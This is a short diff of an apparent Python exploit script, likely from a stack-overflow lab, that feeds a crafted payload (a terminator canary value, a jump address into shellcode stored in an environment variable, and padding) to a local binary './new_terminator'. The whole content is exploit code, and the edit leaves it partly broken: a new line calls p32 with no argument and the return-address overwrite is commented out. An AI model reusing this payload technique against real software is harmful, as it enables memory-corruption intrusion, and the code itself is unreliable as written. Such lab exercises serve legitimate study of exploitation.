@@ -23,12 +23,13 @@ if __name__ == '__main__':
     cmds = ["./new_terminator"]
     env = os.environ
 
-    Dummy = p32(0x88888888)
+    NOP = p32(0x88888888)
     Canary = p32(0xff0a0d00)
+    returnaddress=p32( )    
     JmpToEnv = p32(0xffffc792)  # ./getenv EGG
-    FakeEbp = p32(0xffffbfe4)  # 0xffffbf74 + 0x60 (OFFSET between inside and outside of gdb) + 0x10 (OFFSET inside buffer)
+    #FakeEbp = p32(0xffffbfe4)  # 0xffffbf74 + 0x60 (OFFSET between inside and outside of gdb) + 0x10 (OFFSET inside buffer)
 
-    input = Dummy + Canary + JmpToEnv + Dummy*17 + FakeEbp
+    input = Canary + JmpToEnv + NOP
 
     p = sp.Popen(cmds, env=env, stdin=sp.PIPE, universal_newlines=False)
     p.communicate(input)
